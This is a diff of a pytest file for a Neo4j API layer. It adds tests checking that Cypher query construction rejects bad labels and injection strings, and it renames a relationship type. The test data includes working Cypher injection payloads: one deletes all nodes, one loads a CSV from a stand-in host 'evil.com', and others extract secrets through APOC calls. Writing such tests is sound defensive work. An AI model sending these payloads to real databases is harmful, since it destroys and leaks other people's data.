@@ -1,10 +1,63 @@
 import pytest
-from api.neo4j_interface import Neo4jDB, ReadRequest
+from api.neo4j_interface import Neo4jDB, ReadRequest, construct_cypher_query
 from neo4j import GraphDatabase
 from neo4j.exceptions import ClientError
 import os
 import t_helpers, conftest
 from conftest import URI, AUTH
+
+class TestCypherConstruction:
+    def test_invalid_labels_injection(self):
+        label_w_special_chars = {
+                                # "1Label", # Labeling like this could lead to problems when requesting them without backticks
+                                "-Label",
+                                "Label:Label",
+                                "Label.Name",
+                                "Label with space"
+                                }
+        empty_and_spaces = {
+                            "",
+                            "   ",
+                            "\t",
+                            "\n"}
+        reserved_keywords = {
+                            "$param",
+                            "MATCH",
+                            "WHERE",
+                            "RETURN",
+                            "NULL",
+                            "TRUE",
+                            "FALSE"
+                            }
+        injections = {
+            "Label //",
+            "Label) RETURN n //",
+            "Label` //",
+            "Label) MATCH (n) RETURN n --",
+            "Label) WITH n MATCH (m) RETURN m --",
+            "Label OR 1=1",
+            "` MATCH (n) DETACH DELETE n --",
+            "`) MATCH (n) RETURN n UNION MATCH (m) --",
+            "Label` WITH n CALL db.labels() YIELD label --",
+            "Label) UNION CALL db.labels() YIELD label RETURN count(label) --",
+            "Label) LOAD CSV FROM 'http://evil.com/data' AS line --",
+            "Label) RETURN keys(n) --",
+            "Label) CALL apoc.cypher.runMany('MATCH (n) RETURN n') YIELD result --",
+            "Label) CALL apoc.text.base64Encode(n.secret) YIELD value RETURN value --"
+        }
+        label_w_special_chars.update(empty_and_spaces, reserved_keywords, injections)
+        for l in label_w_special_chars:
+            with pytest.raises(ValueError) as exc_info:
+                construct_cypher_query(l)
+                pytest.fail(f"Cypher Construction Test: Value Error not risen for label {l}")
+            assert exc_info.type == ValueError, f"Cypher Construction did not catch special char {l}"
+
+
+
+
+
+
+
 
 
 def test_simple_db_reads(db: "Neo4jDB"):
@@ -77,18 +130,18 @@ def test_simple_relationships(db: "Neo4jDB"):
     "Basic relationship requests from the Data-Layer Neo4jDB class"
     label1 = "Student"
 
-    req = ReadRequest([label1], label1, 3,  None, None, ["ENROLLED_IN"])
+    req = ReadRequest([label1], label1, 3,  None, None, ["ENROLLED"])
     records = list(db.read_data(req))
 
     assert len(records) > 5, f"To little records for student-class enrolled relation {records}"
     for r in records:
          relation = r.data()["r"]
-         assert relation[1] == "ENROLLED_IN", f"[Test] , no relation in {relation}, or at least not at index 1? "
+         assert relation[1] == "ENROLLED", f"[Test] , no relation in {relation}, or at least not at index 1? "
 
 def test_unpresent_label(db):
     " Basic requests for a label that doesnt exist from the Data-Layer Neo4jDB class"
     m_label = "COOOOKIES"
-    req = ReadRequest([m_label], m_label, 3,  None, None, ["ENROLLED_IN"])
+    req = ReadRequest([m_label], m_label, 3,  None, None, ["ENROLLED"])
     records = list(db.read_data(req))
     assert len(records) == 0
 
@@ -107,7 +160,7 @@ def test_bad_limit(db):
             db.read_data(req)
 
 
-class TestCypherInjection:
+class TestCypherInjectionDBInterfaceLevel:
     INJECTION_PAYLOADS = {
     "tautology": "' OR 1=1 --",
     "union_extraction": "' UNION ALL MATCH (n) RETURN n --",
@@ -119,7 +172,7 @@ class TestCypherInjection:
         Attempts to inject logic into the 'where_props' values.
         If vulnerable, 'OR 1=1' would return ALL students instead of none.
         """
-        malicious_name = "NonExistentUser" + TestCypherInjection.INJECTION_PAYLOADS["tautology"]
+        malicious_name = "NonExistentUser" + TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["tautology"]
 
         req = ReadRequest(
             selected_labels=["Student"],
@@ -140,7 +193,7 @@ class TestCypherInjection:
         Dynamic labels are a common vulnerability point.
         """
         req = ReadRequest(
-            selected_labels=[TestCypherInjection.INJECTION_PAYLOADS["malicious_label"]],
+            selected_labels=[TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["malicious_label"]],
             main_label="Student",
             max_depth=1,
             limit=None,
@@ -168,7 +221,7 @@ class TestCypherInjection:
         """
         Attempts to inject Cypher into the 'rel_fitler' list.
         """
-        malicious_rel = "ENROLLED_IN]-(s) RETURN s UNION CALL db.labels() --"
+        malicious_rel = "ENROLLED]-(s) RETURN s UNION CALL db.labels() --"
 
         req = ReadRequest(
             selected_labels=["Student"],
@@ -215,7 +268,7 @@ class TestCypherInjection:
         """
         assert len(t_helpers.STUDENTS) > 0
 
-        malicious_val = "x" + TestCypherInjection.INJECTION_PAYLOADS["destructive"]
+        malicious_val = "x" + TestCypherInjectionDBInterfaceLevel.INJECTION_PAYLOADS["destructive"]
 
         req = ReadRequest(
             selected_labels=["Student"],
